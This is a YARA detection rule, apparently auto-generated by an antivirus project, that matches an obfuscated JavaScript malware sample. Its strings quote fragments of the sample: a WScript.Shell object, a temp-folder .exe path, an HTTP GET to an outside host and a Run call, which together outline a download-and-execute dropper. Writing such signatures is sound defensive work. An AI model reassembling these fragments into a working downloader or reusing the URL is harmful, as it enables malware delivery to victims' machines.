rule sig_20160328_2b0face9162bf32b35a14d99a680bbcf {
  meta:
    description = "datamaliciousorder - file 20160328_2b0face9162bf32b35a14d99a680bbcf.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e0de133973c08d54fce81a8136d2e6ebf2112f30a09689b9f357af10073eb5d9"

  strings:
    $s1  = "function Jrzqqypwrv() {return Blzinvurui[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"kToKyRuSBi.exe\";};" fullword ascii
    $s2  = "Sxtfnd[Jtmwtl](\"GET\", \"http://themesbin.com/k9sjaf\", false);" fullword ascii
    $s3  = "do {WScript[Rgspfjcruq](Qihmzgctc() * 11)} while (Sxtfnd[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Nawehtlr(Dzhrel, Pkzmwdozn){return Dzhrel - Pkzmwdozn;};" fullword ascii
    $s5  = "var Blzinvurui = function Kuubhtfp() {return WScript[Lewdzz](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Lbqhfhxnig(Jaligzouaa){Blzinvurui[\"Run\"](Jaligzouaa, Lmyhorvhu, Lmyhorvhu);};" fullword ascii
    $s7  = "function Mogon() {return ((Bepce == true) && (Bepce == Wndsd)) ? 1 : Lmyhorvhu;};" fullword ascii
    $s8  = " while (Equxbln){" fullword ascii
    $s9  = "var Gnetpcowc = false;" fullword ascii
    $s10 = "var Bepce = false;" fullword ascii
    $s11 = "var Fgkgu = new this[\"Date\"]();" fullword ascii
    $s12 = "Wndsd = true; " fullword ascii
    $s13 = "function Hoecl(Prrxfjv) {var Njnre = (1, 2, 3, 4, 5, Prrxfjv); return Njnre;};" fullword ascii
    $s14 = "function Ltevge()" fullword ascii
    $s15 = "var Wndsd = false;" fullword ascii
    $s16 = "function Tqzrmog(){return Lewdzz;};" fullword ascii
    $s17 = "return Nawehtlr(Ipihifhw, Yqxekegp);" fullword ascii
    $s18 = "function Gaqkbepvkn(){return Fuetbt;};" fullword ascii
    $s19 = "Bepce = true; " fullword ascii
    $s20 = "function Qihmzgctc(){return 22;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}